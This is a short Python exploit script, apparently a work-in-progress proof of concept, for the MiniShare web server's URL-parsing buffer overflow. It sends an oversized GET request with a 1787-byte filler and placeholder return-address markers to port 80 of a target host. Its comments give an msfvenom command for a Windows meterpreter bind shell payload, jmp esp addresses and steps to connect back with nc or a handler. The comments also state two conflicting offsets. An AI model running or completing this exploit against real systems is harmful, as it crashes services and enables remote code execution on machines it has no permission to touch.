#!/usr/bin/python

#Written in python



import socket, sys

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)



#Connect to port 80
sock.connect((sys.argv[1],80))



#Minishare URL parsing is vulnerable,
# We will send a request on the target machine on port 80 with our payload
#We have to use the proper HTTP headers so that the application parses our request.



buf="GET "
#Offset found at 1787
buf+="A"*1787
buf+="BBBB"
buf+="CCCC"
buf+="DDDD"




buf+="HTTP/1.1\r\n\r\n"

#NOP sled. Your address might be an instruction space which is not properly pointed to by stack due to various reasons.



#msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.59.130 LPORT=44444 --bad-chars '\x00\x0a\x0d' -f python
#Your shellcode might have bad characters as well which need to be truncated.



#jmp esp 7E 42 93 53 at this address there is a jmp esp,also at --> 66 2E B2 4F


#Shellcode,same as one used for the Memcpy

#offset found by pattern generator and ImmunityDBG to be 268

#Once this is done you may use nc or meterpreter handler to connect back or listen depending on the payload you sent.

sock.send(buf)
sock.close()

